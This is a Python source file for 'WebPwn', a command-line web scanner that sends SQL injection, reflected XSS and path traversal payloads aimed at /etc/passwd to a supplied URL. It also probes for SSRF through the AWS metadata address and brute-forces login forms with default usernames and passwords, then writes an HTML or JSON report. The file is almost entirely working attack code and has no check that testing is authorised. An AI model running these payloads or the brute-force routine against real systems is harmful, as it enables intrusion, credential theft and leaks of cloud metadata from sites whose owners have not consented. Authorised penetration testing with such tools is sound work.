import requests
import argparse
import time
import json
from urllib.parse import urljoin
from bs4 import BeautifulSoup
from jinja2 import Template

# ---- Configurations ----
USER_AGENT = "WebPwn/1.0"
HEADERS = {"User-Agent": USER_AGENT}
TIMEOUT = 15
THREADS = 5  # For multi-threading (future use)

# ---- Core Modules ----
class WebPwnModules:
    @staticmethod
    def sqli_test(target_url, param, method="GET"):
        """Detect SQL Injection vulnerabilities."""
        payloads = [
            "' OR '1'='1",
            "' OR 1=1 --",
            "\" OR \"1\"=\"1",
            "admin'--"
        ]
        for payload in payloads:
            try:
                if method.upper() == "GET":
                    r = requests.get(
                        target_url,
                        params={param: payload},
                        headers=HEADERS,
                        timeout=TIMEOUT
                    )
                else:
                    r = requests.post(
                        target_url,
                        data={param: payload},
                        headers=HEADERS,
                        timeout=TIMEOUT
                    )
                if any(error in r.text.lower() for error in ["syntax error", "mysql", "ora-"]):
                    return True, f"SQLi detected with payload: {payload}"
            except Exception as e:
                continue
        return False, "No SQLi vulnerabilities found."

    @staticmethod
    def xss_test(target_url, param, method="GET"):
        """Detect Cross-Site Scripting (XSS) vulnerabilities."""
        payload = "<script>alert('XSS')</script>"
        try:
            if method.upper() == "GET":
                r = requests.get(
                    target_url,
                    params={param: payload},
                    headers=HEADERS,
                    timeout=TIMEOUT
                )
            else:
                r = requests.post(
                    target_url,
                    data={param: payload},
                    headers=HEADERS,
                    timeout=TIMEOUT
                )
            if payload in r.text:
                return True, "Reflected XSS detected."
        except Exception as e:
            pass
        return False, "No XSS vulnerabilities found."

    @staticmethod
    def lfi_test(target_url, param):
        """Detect Local File Inclusion (LFI) vulnerabilities."""
        payloads = [
            "../../../../etc/passwd",
            "....//....//etc/passwd",
            "%2e%2e%2fetc%2fpasswd"
        ]
        for payload in payloads:
            try:
                r = requests.get(
                    target_url,
                    params={param: payload},
                    headers=HEADERS,
                    timeout=TIMEOUT
                )
                if "root:" in r.text:
                    return True, f"LFI detected (leaked: /etc/passwd)"
            except:
                continue
        return False, "No LFI vulnerabilities found."

    @staticmethod
    def brute_force_login(login_url, username_param, password_param, username_list, password_list):
        """Brute-force login pages."""
        for user in username_list:
            for pwd in password_list:
                try:
                    data = {username_param: user, password_param: pwd}
                    r = requests.post(
                        login_url,
                        data=data,
                        headers=HEADERS,
                        timeout=TIMEOUT
                    )
                    if "logout" in r.text.lower() or "dashboard" in r.text.lower():
                        return True, f"Valid credentials: {user}:{pwd}"
                except:
                    continue
        return False, "No valid credentials found."

    @staticmethod
    def ssrf_test(target_url, param):
        """Detect Server-Side Request Forgery (SSRF) vulnerabilities."""
        test_url = "http://169.254.169.254/latest/meta-data/"
        try:
            r = requests.get(
                target_url,
                params={param: test_url},
                headers=HEADERS,
                timeout=TIMEOUT
            )
            if "ami-id" in r.text:
                return True, "SSRF detected (AWS metadata leaked)."
        except:
            pass
        return False, "No SSRF vulnerabilities found."

# ---- Reporting ----
def generate_html_report(results, filename="webpwn_report.html"):
    """Generate an HTML report."""
    template = """
    <!DOCTYPE html>
    <html>
    <head>
        <title>WebPwn Report</title>
        <style>
            body { font-family: Arial, sans-serif; margin: 20px; }
            .vulnerable { color: red; }
            .safe { color: green; }
            .test { margin-bottom: 15px; padding: 10px; border: 1px solid #ddd; }
        </style>
    </head>
    <body>
        <h1>WebPwn Penetration Test Report</h1>
        {% for test in results %}
        <div class="test {% if test.is_vulnerable %}vulnerable{% else %}safe{% endif %}">
            <h3>{{ test.name }}</h3>
            <p><strong>Status:</strong> {{ test.status }}</p>
            <p><strong>Payload:</strong> <code>{{ test.payload|default('N/A') }}</code></p>
        </div>
        {% endfor %}
    </body>
    </html>
    """
    html = Template(template).render(results=results)
    with open(filename, "w") as f:
        f.write(html)
    print(f"[+] Report saved to {filename}")

def generate_json_report(results, filename="webpwn_report.json"):
    """Generate a JSON report."""
    with open(filename, "w") as f:
        json.dump(results, f, indent=4)
    print(f"[+] JSON report saved to {filename}")

# ---- CLI Interface ----
def main():
    parser = argparse.ArgumentParser(description="WebPwn - Advanced Web Penetration Testing Tool")
    parser.add_argument("-u", "--url", required=True, help="Target URL")
    parser.add_argument("-p", "--param", help="Parameter to test")
    parser.add_argument("--login-url", help="Login page URL for brute-force")
    parser.add_argument("--user-param", help="Username parameter name")
    parser.add_argument("--pass-param", help="Password parameter name")
    parser.add_argument("--method", choices=["GET", "POST"], default="GET", help="HTTP method")
    parser.add_argument("--report-format", choices=["html", "json"], default="html", help="Report format")
    args = parser.parse_args()

    results = []
    tester = WebPwnModules()

    # SQL Injection Test
    if args.param:
        vuln, msg = tester.sqli_test(args.url, args.param, args.method)
        results.append({
            "name": "SQL Injection",
            "status": msg,
            "is_vulnerable": vuln,
            "payload": "' OR '1'='1" if vuln else None
        })

    # XSS Test
    if args.param:
        vuln, msg = tester.xss_test(args.url, args.param, args.method)
        results.append({
            "name": "XSS",
            "status": msg,
            "is_vulnerable": vuln,
            "payload": "<script>alert('XSS')</script>" if vuln else None
        })

    # LFI Test
    if args.param:
        vuln, msg = tester.lfi_test(args.url, args.param)
        results.append({
            "name": "LFI",
            "status": msg,
            "is_vulnerable": vuln,
            "payload": "../../../../etc/passwd" if vuln else None
        })

    # Brute-Force Test
    if args.login_url and args.user_param and args.pass_param:
        vuln, msg = tester.brute_force_login(
            args.login_url,
            args.user_param,
            args.pass_param,
            ["admin", "root"],
            ["password", "123456"]
        )
        results.append({
            "name": "Brute-Force",
            "status": msg,
            "is_vulnerable": vuln,
            "payload": "admin:password" if vuln else None
        })

    # SSRF Test
    if args.param:
        vuln, msg = tester.ssrf_test(args.url, args.param)
        results.append({
            "name": "SSRF",
            "status": msg,
            "is_vulnerable": vuln,
            "payload": "http://169.254.169.254/" if vuln else None
        })

    # Generate Report
    if args.report_format == "html":
        generate_html_report(results)
    else:
        generate_json_report(results)

if __name__ == "__main__":
    main()
